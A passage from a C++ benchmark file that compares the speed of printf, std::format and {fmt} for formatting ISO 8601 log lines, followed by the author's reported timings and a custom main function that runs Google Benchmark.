            tm->tm_hour, tm->tm_min, tm->tm_sec, static_cast<int>(milliseconds.count()), // time
            location.file_name(), location.line(), code,                                 // location and code
            static_cast<int>(message.size()), message.data()                             // message of known length
        );
        return static_cast<std::size_t>(count_bytes);
    }
};

#if defined(__cpp_lib_format)
#include <format> // `std::format_to_n`

struct log_format_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {

        auto now = std::chrono::high_resolution_clock::now();
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // ISO 8601 defines the format as: YYYY-MM-DDTHH:MM:SS.mmm
        // `%F` unpacks to `%Y-%m-%d`, implementing the "YYYY-MM-DD" part
        // `%T` would expand to `%H:%M:%S`, implementing the "HH:MM:SS" part
        // To learn more about syntax, read: https://fmt.dev/11.0/syntax/
        std::format_to_n_result<char *> result = std::format_to_n( //
            buffer, buffer_size,
            "{:%FT%R}:{:0>2}.{:0>3}Z | "                     // time format
            "{}:{} <{:0>3}> "                                // location and code format
            "\"{}\"\n",                                      // message format
            now, static_cast<unsigned int>(seconds.count()), // date and time
            static_cast<unsigned int>(milliseconds.count()), // milliseconds
            location.file_name(), location.line(), code,     // location and code
            message                                          // message of known length
        );
        return static_cast<std::size_t>(result.size);
    }
};

#endif // defined(__cpp_lib_format)

#include <fmt/chrono.h>  // formatting for `std::chrono` types
#include <fmt/compile.h> // compile-time format strings
#include <fmt/core.h>    // `std::format_to_n`

struct log_fmt_t {
    std::size_t operator()(                    //
        char *buffer, std::size_t buffer_size, //
        std::source_location const &location, int code, std::string_view message) const noexcept {
        auto now = std::chrono::high_resolution_clock::now();
        auto time_since_epoch = now.time_since_epoch();

        // Extract seconds and milliseconds
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(time_since_epoch);
        auto milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(time_since_epoch) - seconds;

        // ISO 8601 defines the format as: YYYY-MM-DDTHH:MM:SS.mmm
        // `%F` unpacks to `%Y-%m-%d`, implementing the "YYYY-MM-DD" part
        // `%T` would expand to `%H:%M:%S`, implementing the "HH:MM:SS" part
        // To learn more about syntax, read: https://fmt.dev/11.0/syntax/
        fmt::format_to_n_result<char *> result = fmt::format_to_n( //
            buffer, buffer_size,
            FMT_COMPILE(                                     //
                "{:%FT%R}:{:0>2}.{:0>3}Z | "                 // time format
                "{}:{} <{:0>3}> "                            // location and code format
                "\"{}\"\n"),                                 // message format
            now, static_cast<unsigned int>(seconds.count()), // date and time
            static_cast<unsigned int>(milliseconds.count()), // milliseconds
            location.file_name(), location.line(), code,     // location and code
            message                                          // message of known length
        );
        return static_cast<std::size_t>(result.size);
    }
};

template <typename logger_type_>
static void logging(bm::State &state) {
    struct {
        int code;
        std::string_view message;
    } errors[3] = {
        {1, "Operation not permitted"sv},
        {12, "Cannot allocate memory"sv},
        {113, "No route to host"sv},
    };
    char buffer[1024];
    logger_type_ logger;
    std::size_t iteration_index = 0;
    std::size_t bytes_logged = 0;
    for (auto _ : state) {
        bytes_logged += logger(              //
            buffer, sizeof(buffer),          //
            std::source_location::current(), //
            errors[iteration_index % 3].code, errors[iteration_index % 3].message);
        iteration_index++;
    }
    state.SetBytesProcessed(bytes_logged);
}

BENCHMARK(logging<log_printf_t>)->Name("log_printf")->MinTime(2);
#if defined(__cpp_lib_format)
BENCHMARK(logging<log_format_t>)->Name("log_format")->MinTime(2);
#endif
BENCHMARK(logging<log_fmt_t>)->Name("log_fmt")->MinTime(2);

/**
 *  The results for the logging benchmarks are as follows:
 *  - `log_printf`: @b 321ns
 *  - `log_format`: @b 416ns
 *  - `log_fmt`: @b 171ns
 *
 *  The `std::format` is based on the `fmt`, but it's clearly very far behind.
 *  The lack of compile-time format definitions and custom allocators support
 *  make the adaptation unusable for high-performance logging.
 *
 *  @see "{fmt} is Addictive! Using {fmt} and spdlog"
 *       by Jason Turner for C++ Weekly - Ep. 135: https://youtu.be/KeS1ehp9IiI
 *  @see "A modern formatting library for C++" by Victor Zverovich at CppCon 2017:
 *       https://youtu.be/ptba_AqFYCM
 */

#endif            // defined(__cpp_lib_source_location)
#pragma endregion // Logs

#pragma endregion // - Exceptions, Backups, Logging

/**
 *  The default variant is to invoke the `BENCHMARK_MAIN()` macro.
 *  Alternatively, we can unpack it, if we want to augment the main function
 *  with more system logging logic or pre-process some datasets before running.
 */

int main(int argc, char **argv) {

    // Let's log the CPU specs:
    std::size_t const cache_line_width = fetch_cache_line_width();
    std::printf("Cache line width: %zu bytes\n", cache_line_width);

    // Make sure the defaults are set correctly:
    char arg0_default[] = "benchmark";
    char *args_default = arg0_default;
    if (!argv) argc = 1, argv = &args_default;
    bm::Initialize(&argc, argv);
    if (bm::ReportUnrecognizedArguments(argc, argv)) return 1;
    bm::RunSpecifiedBenchmarks();
    bm::Shutdown();
    return 0;
}
